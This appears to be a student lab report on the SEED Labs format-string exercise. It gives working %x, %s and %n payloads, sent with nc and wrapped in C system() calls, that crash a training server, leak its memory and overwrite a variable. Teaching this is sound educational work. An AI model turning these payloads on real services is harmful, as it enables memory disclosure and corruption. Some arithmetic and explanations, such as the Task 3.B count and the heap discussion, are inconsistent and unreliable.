# Question 1

## Setup
To start, we disabled address randomization, as the program's address layout and order is crucial for this attack.

```bash
$ sudo sysctl -w kernel.randomize_va_space=0
```

The server's program.c was compiled with the **-z execstack** flag to allow code execution within the stack.

We then opened two terminals, one with the server using Docker from Seed Labs and another as a client to communicate with the servers. This setup allowed us to observe messages exchanged between both sides. We then send the string asked to the server:

```bash
$ echo 'hello' | nc 10.9.0.5 9090
```
 ![hello](/docs/images/hello.png)

The server returned necessary information for the following tasks:
- Input buffer address
- Secret message address
- Addresses of a target variable
- Frame pointer for the myprintf function


## Task 1
To crash the server, we sent the following input:

```bash
$ echo '%n' | nc 10.9.0.5 9090
```
 ![crash](/docs/images/crash.png)

The format string attempts to write with %n to a memory address outside the allowed address space of the process caused a crash, resulting in a segmentation fault. The absence of the "Returned properly" message confirmed the server had crashed.


## Task 2

### Task 2.A	
We used "DJLD", represented in hexadecimal as "444A4C44", to print the first 4 bytes of the input from the format string. 
Our initial approach was to input "DJLD" concatenated with multiple "%08x" format specifiers.

```bash
echo "DJLD%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X" | nc 10.9.0.5 9090
 ```

![letters](/docs/images/letters.png)

The final "444C4A44" is the address of our input "DJLD". Observing that each address has 8 characters (32-bit addresses), we determined there are 63 stack addresses between the format string and the buffer. Thus, a string with exactly 64 "%x" is needed to print the initial 4 bytes of the input.

### Task 2.B
To print a string from the heap at address 0x080b4008, we encoded the address as "\x08\x0b\x40\x08". With 63 "%08x" and a final "%s", the format string reads from this address and returns the hidden value.

We created a func.c file and compiled it:

```C
#include <stdlib.h>
#include <string.h>

int main() {
    char cmd[296] = "echo \x08\x40\x0b\x08%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X %s | nc 10.9.0.5 9090";
    system(cmd);
    return 0;
}
```

```bash
gcc -o func fun.c 
```

And then run it:

```bash
./func
```
 
 ![secret](/docs/images/secret.png)

The server confirmed the message at this address is  "A secret message."


## Task 3

### Task 3.A

Here, we needed to modify the value of the target variable. Initially, it held 0x11223344, and its address was 0x080e5068.
Using %n, like we used in task 1, we could write the count of characters printed so far to the specified address. This approach involved a command similar to Task 2.B, we just wrote to the address instead of reading from it.

The modified func.c file was:

```C
#include <stdlib.h>
#include <string.h>

int main() {
    char cmd[296] = "echo \x68\x50\x0e\x08%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X %n | nc 10.9.0.5 9090";
    system(cmd);
    return 0;
}
```

 ![change](/docs/images/change.png)

The target value changed.


### Task 3.B

This time, we needed to set the target variable to a specific value: 0x5000 (20480 in decimal). Knowing %n would write the character count, we crafted an input with 20408 characters, and used %.NX, with N = 19980 (computed by subtracting 4 and the 63 * 8 from 20408), to achieve the required count.

The modified func.c file was:

```C
#include <stdlib.h>
#include <string.h>

int main() {
    char cmd[] = "echo \x68\x50\x0e\x08%.19980X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%n | nc 10.9.0.5 9090";
    system(cmd);
    return 0;
}

```

 ![5000](/docs/images/5000.png)

The target variable was now 0x00005000.


# Question 2:

CWE-134 format string vulnerabilities occur when user-controlled data is unsafely passed to formatting functions, allowing attackers to manipulate memory via format specifiers.
When the format string is on the stack:
Reading stack data is easier using %x or %s, as stack addresses and data are accessible.
Writing to the stack with %n allows attackers to overwrite critical stack values, like local variables or return addresses.
If the format string is on the heap:
Reading and writing to the stack becomes difficult, as %x and %n would target the heap instead.
Attacks relying on stack manipulation, like reading stack addresses or overwriting variables, would fail or be less effective.
Allocating the format string on the stack makes attacks easier, while placing it on the heap complicates exploitation, though it doesn't eliminate the risk.

- Task 2.A - Reading Stack Addresses: The %x attack, which reveals stack addresses, would fail because it depends on accessing stack memory. With the format string on the heap, only heap addresses would be revealed.
- Task 2.B (Reading String from Heap): While this attack relies on reading from a specific heap address, the format string's location in the heap would make it harder to control and predict the memory layout, making the attack less reliable.
- Task 3.A - Writing to Stack Variables with %n: Modifying stack variables using %n would also not work since %n would write to heap memory, not affecting the stack variables.
- Task 3.B - Setting a Specific Value on the Stack with %n: Writing a specific value to the stack with %n would fail because %n would target the heap instead of the intended stack address.


